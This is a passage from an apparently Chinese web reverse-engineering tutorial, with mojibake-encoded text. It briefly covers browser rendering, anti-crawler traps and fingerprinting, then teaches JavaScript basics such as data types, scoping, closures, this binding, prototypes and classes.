    JS -.-&gt;|ä¿®æ”¹æ ·å¼| CSSOM
    JS -.-&gt;|è§¦å‘ Reflow| LayoutCalc
    JS -.-&gt;|è§¦å‘ Repaint| PaintOps

    style Display fill:#51cf66
    style JS fill:#fff9e1
</code></pre>

      <h3 id="reverse-engineering-context-é˜»å¡ä¸æ£€æµ‹">[Reverse Engineering Context] é˜»å¡ä¸æ£€æµ‹</h3>

      <ul>
        <li><strong>JS é˜»å¡æ¸²æŸ“</strong>: JS å¼•æ“å’Œæ¸²æŸ“å¼•æ“é€šå¸¸æ˜¯äº’æ–¥çš„ï¼ˆè¿è¡Œåœ¨åŒä¸€ä¸»çº¿ç¨‹ï¼‰ã€‚å¦‚æœ JS æ‰§è¡Œæ­»å¾ªç¯æˆ–ç¹é‡è®¡ç®—ï¼Œé¡µé¢ä¼šå‡æ­»ã€‚</li>
        <li><strong>æ£€æµ‹ä¸å¯è§å…ƒç´ </strong>: æŸäº›åçˆ¬è™«ä¼šåœ¨é¡µé¢æ’å…¥ <code>opacity: 0</code> æˆ– <code>visibility: hidden</code>
          çš„å…ƒç´ æ¥è¿·æƒ‘çˆ¬è™«ã€‚è™½ç„¶äººçœ¼çœ‹ä¸è§ï¼Œä½†å®ƒä»¬å­˜åœ¨äº DOM å’Œ CSSOM ä¸­ã€‚å¦‚æœçˆ¬è™«å°è¯•ç‚¹å‡»è¿™äº›â€œä¸å¯è§â€çš„é™·é˜±å…ƒç´ ï¼Œå°±ä¼šæš´éœ²èº«ä»½ã€‚</li>
      </ul>

      <hr />

      <h2 id="javascript-å¼•æ“-v8">JavaScript å¼•æ“ (V8)</h2>

      <p>V8 æ˜¯ Chrome çš„ JS å¼•æ“ï¼Œä¹Ÿæ˜¯ Node.js çš„æ ¸å¿ƒã€‚</p>

      <ol>
        <li><strong>JIT (Just-In-Time) ç¼–è¯‘</strong>: V8 ä¸åªæ˜¯è§£é‡Šæ‰§è¡Œï¼Œè¿˜ä¼šå°†çƒ­ç‚¹ä»£ç ç¼–è¯‘æˆæœºå™¨ç ã€‚</li>
        <li><strong>åƒåœ¾å›æ”¶ (GC)</strong>: è‡ªåŠ¨ç®¡ç†å†…å­˜ã€‚</li>
      </ol>

      <hr />

      <h2 id="æµè§ˆå™¨æŒ‡çº¹-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹ (Browser Fingerprinting)</h2>

      <p>æµè§ˆå™¨æ¶æ„çš„å¾®å°å·®å¼‚å¯¼è‡´äº†æŒ‡çº¹çš„äº§ç”Ÿã€‚</p>

      <ul>
        <li><strong>Canvas æŒ‡çº¹</strong>: ä¸åŒ OS + æ˜¾å¡ + é©±åŠ¨åœ¨æ¸²æŸ“å­—ä½“å’ŒæŠ—é”¯é½¿æ—¶æœ‰å¾®å°å·®å¼‚ã€‚</li>
        <li><strong>WebGL æŒ‡çº¹</strong>: åŒæ ·åˆ©ç”¨ GPU çš„å·®å¼‚ã€‚</li>
        <li><strong>Font æŒ‡çº¹</strong>: ç³»ç»Ÿå®‰è£…çš„å­—ä½“åˆ—è¡¨ã€‚</li>
      </ul>

      <p>é€†å‘å·¥ç¨‹å¸ˆéœ€è¦è¯†åˆ«è¿™äº›æŒ‡çº¹é‡‡é›†ç‚¹ï¼Œä»¥ä¾¿åœ¨è‡ªåŠ¨åŒ–å·¥å…·ä¸­è¿›è¡Œä¼ªé€ ï¼ˆMockï¼‰ã€‚</p>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>æµè§ˆå™¨æ¶æ„çœ‹ä¼¼åº•å±‚ï¼Œä½†å…¶å®ä¸ä¸Šå±‚çš„ JS é€†å‘æ¯æ¯ç›¸å…³ã€‚ä»è¿›ç¨‹æ¨¡å‹åˆ°æ¸²æŸ“æµæ°´çº¿ï¼Œæ¯ä¸€ä¸ªç¯èŠ‚éƒ½å¯èƒ½éšè—ç€åçˆ¬è™«çš„æ£€æµ‹ç‚¹æˆ– Bypass çš„åˆ‡å…¥ç‚¹ã€‚</p>

    </div>

    <div class="section" id="01-Foundations-javascript-basics">
      <h2>7. JavaScript Basics</h2>
      <h1 id="javascript-åŸºç¡€">JavaScript åŸºç¡€</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>JavaScript æ˜¯ Web é€†å‘å·¥ç¨‹ä¸­æœ€é‡è¦çš„è¯­è¨€ã€‚æŒæ¡ JavaScript çš„æ ¸å¿ƒæ¦‚å¿µå¯¹äºç†è§£å’Œåˆ†æ Web åº”ç”¨è‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="æ•°æ®ç±»å‹">æ•°æ®ç±»å‹</h2>

      <h3 id="åŸºæœ¬ç±»å‹primitive-types">åŸºæœ¬ç±»å‹ï¼ˆPrimitive Typesï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Number</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">42</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="kr">float</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3.14</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">hex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">;</span><span class="w">  </span><span class="c1">// 255</span>

<span class="c1">// String</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Hello&quot;</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;World&#39;</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">str</span><span class="si">}</span><span class="sb"> </span><span class="si">${</span><span class="nx">str2</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span><span class="w">  </span><span class="c1">// &quot;Hello World&quot;</span>

<span class="c1">// Boolean</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">isTrue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">isFalse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="c1">// Undefined</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">notDefined</span><span class="p">;</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">notDefined</span><span class="p">);</span><span class="w">  </span><span class="c1">// undefined</span>

<span class="c1">// Null</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">empty</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>

<span class="c1">// Symbol (ES6+)</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">sym</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Symbol</span><span class="p">(</span><span class="s1">&#39;description&#39;</span><span class="p">);</span>

<span class="c1">// BigInt (ES2020+)</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">bigNum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1234567890123456789012345678901234567890n</span><span class="p">;</span>
</code></pre>
      </div>

      <h3 id="å¼•ç”¨ç±»å‹reference-types">å¼•ç”¨ç±»å‹ï¼ˆReference Typesï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Object</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;John&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">age</span><span class="o">:</span><span class="w"> </span><span class="mf">30</span><span class="p">,</span>
<span class="w">    </span><span class="nx">greet</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Hello&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="c1">// Array</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">];</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">mixed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;two&quot;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">key</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;value&quot;</span><span class="p">}];</span>

<span class="c1">// Function</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">myFunc</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Hello&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Date</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>

<span class="c1">// RegExp</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">regex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/pattern/gi</span><span class="p">;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å˜é‡å£°æ˜">å˜é‡å£°æ˜</h2>

      <h3 id="var-vs-let-vs-const">var vs let vs const</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// var: å‡½æ•°ä½œç”¨åŸŸï¼Œå­˜åœ¨å˜é‡æå‡</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w">  </span><span class="c1">// åŒä¸€ä¸ªå˜é‡</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span><span class="w">  </span><span class="c1">// 2</span>
<span class="p">}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span><span class="w">  </span><span class="c1">// 2</span>

<span class="c1">// let: å—ä½œç”¨åŸŸï¼Œæ— å˜é‡æå‡</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w">  </span><span class="c1">// ä¸åŒçš„å˜é‡</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span><span class="w">  </span><span class="c1">// 2</span>
<span class="p">}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span><span class="w">  </span><span class="c1">// 1</span>

<span class="c1">// const: å—ä½œç”¨åŸŸï¼Œå¸¸é‡ï¼ˆå¼•ç”¨ä¸å¯å˜ï¼‰</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="c1">// z = 2;  // é”™è¯¯ï¼šä¸èƒ½é‡æ–°èµ‹å€¼</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;John&quot;</span><span class="p">};</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Jane&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// å¯ä»¥ä¿®æ”¹å¯¹è±¡å±æ€§</span>
<span class="c1">// obj = {};  // é”™è¯¯ï¼šä¸èƒ½é‡æ–°èµ‹å€¼</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ä½œç”¨åŸŸä¸é—­åŒ…">ä½œç”¨åŸŸä¸é—­åŒ…</h2>

      <h3 id="ä½œç”¨åŸŸé“¾">ä½œç”¨åŸŸé“¾</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nb">global</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;global&quot;</span><span class="p">;</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">outer</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">outerVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;outer&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">inner</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">innerVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;inner&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">global</span><span class="p">);</span><span class="w">    </span><span class="c1">// &quot;global&quot;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">outerVar</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;outer&quot;</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">innerVar</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;inner&quot;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">inner</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">outer</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="é—­åŒ…closure">é—­åŒ…ï¼ˆClosureï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">createCounter</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">increment</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">count</span><span class="o">++</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="nx">decrement</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">count</span><span class="o">--</span><span class="p">;</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="nx">getCount</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="kd">let</span><span class="w"> </span><span class="nx">counter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">createCounter</span><span class="p">();</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">counter</span><span class="p">.</span><span class="nx">increment</span><span class="p">());</span><span class="w">  </span><span class="c1">// 1</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">counter</span><span class="p">.</span><span class="nx">increment</span><span class="p">());</span><span class="w">  </span><span class="c1">// 2</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">counter</span><span class="p">.</span><span class="nx">getCount</span><span class="p">());</span><span class="w">   </span><span class="c1">// 2</span>
</code></pre>
      </div>

      <p><strong>åœ¨é€†å‘ä¸­çš„åº”ç”¨</strong>ï¼šå¾ˆå¤š JS åŠ å¯†å‡½æ•°ä½¿ç”¨é—­åŒ…æ¥éšè—å¯†é’¥ã€‚</p>

      <hr />

      <h2 id="this-å…³é”®å­—">this å…³é”®å­—</h2>

      <h3 id="this-çš„ç»‘å®šè§„åˆ™">this çš„ç»‘å®šè§„åˆ™</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// 1. é»˜è®¤ç»‘å®š - æŒ‡å‘å…¨å±€å¯¹è±¡ï¼ˆä¸¥æ ¼æ¨¡å¼ä¸‹ä¸º undefinedï¼‰</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">defaultBinding</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w">  </span><span class="c1">// window (æµè§ˆå™¨) æˆ– global (Node.js)</span>
<span class="p">}</span>

<span class="c1">// 2. éšå¼ç»‘å®š - æŒ‡å‘è°ƒç”¨å¯¹è±¡</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;John&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">greet</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
<span class="nx">obj</span><span class="p">.</span><span class="nx">greet</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;John&quot;</span>

<span class="c1">// 3. æ˜¾å¼ç»‘å®š - ä½¿ç”¨ call/apply/bind</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">greet</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="p">}</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Jane&quot;</span><span class="p">};</span>
<span class="nx">greet</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">person</span><span class="p">);</span><span class="w">   </span><span class="c1">// &quot;Jane&quot;</span>
<span class="nx">greet</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">person</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Jane&quot;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">boundGreet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">greet</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">person</span><span class="p">);</span>
<span class="nx">boundGreet</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;Jane&quot;</span>

<span class="c1">// 4. new ç»‘å®š - æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">Person</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Person</span><span class="p">(</span><span class="s2">&quot;Bob&quot;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Bob&quot;</span>

<span class="c1">// 5. ç®­å¤´å‡½æ•° - ç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„ this</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">obj2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;Alice&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">greet</span><span class="o">:</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span><span class="w">  </span><span class="c1">// undefinedï¼ˆç»§æ‰¿å¤–å±‚ thisï¼‰</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">greet2</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span><span class="w">  </span><span class="c1">// &quot;Alice&quot;ï¼ˆç»§æ‰¿ greet2 çš„ thisï¼‰</span>
<span class="w">        </span><span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åŸå‹ä¸åŸå‹é“¾">åŸå‹ä¸åŸå‹é“¾</h2>

      <h3 id="åŸå‹åŸºç¡€">åŸå‹åŸºç¡€</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">Person</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// åœ¨åŸå‹ä¸Šå®šä¹‰æ–¹æ³•</span>
<span class="nx">Person</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">greet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Hello, I&#39;m </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="p">};</span>

<span class="kd">let</span><span class="w"> </span><span class="nx">p1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Person</span><span class="p">(</span><span class="s2">&quot;John&quot;</span><span class="p">);</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">p2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Person</span><span class="p">(</span><span class="s2">&quot;Jane&quot;</span><span class="p">);</span>

<span class="nx">p1</span><span class="p">.</span><span class="nx">greet</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;Hello, I&#39;m John&quot;</span>
<span class="nx">p2</span><span class="p">.</span><span class="nx">greet</span><span class="p">();</span><span class="w">  </span><span class="c1">// &quot;Hello, I&#39;m Jane&quot;</span>

<span class="c1">// p1 å’Œ p2 å…±äº«åŒä¸€ä¸ª greet æ–¹æ³•</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">p1</span><span class="p">.</span><span class="nx">greet</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">p2</span><span class="p">.</span><span class="nx">greet</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
</code></pre>
      </div>

      <h3 id="åŸå‹é“¾">åŸå‹é“¾</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nx">a</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">};</span>

<span class="c1">// åŸå‹é“¾ï¼šobj -&gt; Object.prototype -&gt; null</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">__proto__</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">);</span><span class="w">  </span><span class="c1">// true</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">);</span><span class="w">  </span><span class="c1">// null</span>

<span class="c1">// å±æ€§æŸ¥æ‰¾ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj</span><span class="p">.</span><span class="nx">toString</span><span class="p">);</span><span class="w">  </span><span class="c1">// [Function: toString] (æ¥è‡ª Object.prototype)</span>
</code></pre>
      </div>

      <h3 id="class-è¯­æ³•es6">Class è¯­æ³•ï¼ˆES6+ï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">class</span><span class="w"> </span><span class="nx">Person</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">greet</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Hello, I&#39;m </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="nx">species</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Homo sapiens&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span><span class="w"> </span><span class="nx">Student</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="nx">Person</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">grade</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">super</span><span class="p">(</span><span class="nx">name</span><span class="p">);</span>
<span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">grade</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">grade</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">study</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb"> is studying in grade </span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">grade</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
